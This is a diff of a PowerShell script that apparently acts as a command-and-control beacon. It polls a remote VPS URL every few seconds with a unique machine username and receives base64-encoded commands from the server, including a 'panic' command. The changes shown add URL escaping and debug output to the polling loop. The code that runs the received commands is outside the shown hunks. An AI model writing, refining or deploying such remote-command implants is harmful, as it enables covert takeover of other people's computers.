@@ -38,16 +38,25 @@ Write-Host "Username: [$uniqueUser]"
 try {
   while ($true) {
     try {
-      $u = "$VPS_POLL_URL?username=$uniqueUser"
+      $u = $VPS_POLL_URL + "?username=" + [System.Uri]::EscapeDataString($uniqueUser)
 
-      $r = Invoke-RestMethod -Method Get -Uri $u -TimeoutSec 10
+      Write-Host "Polling URL: [$u]"
+
+      $uri = New-Object System.Uri($u)
+
+      Write-Host "URI Host: [$($uri.Host)]"
+      Write-Host "URI Path: [$($uri.AbsolutePath)]"
+
+      $r = Invoke-RestMethod -Method Get -Uri $uri -TimeoutSec 10
 
       Write-Host "$(Get-Date -Format 'HH:mm:ss') poll OK"
 
       if ($r.run -eq $true) {
         Write-Host "Command received"
 
-        $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r.cmd))
+        $c = [System.Text.Encoding]::UTF8.GetString(
+          [System.Convert]::FromBase64String($r.cmd)
+        )
 
         if ($c -match "panic") {
           Write-Host "Panic command received"
@@ -76,6 +85,7 @@ try {
     }
     catch {
       Write-Host "POLL ERROR: $($_.Exception.Message)"
+      Write-Host "POLL URL: [$u]"
     }
 
     Start-Sleep -Seconds 3
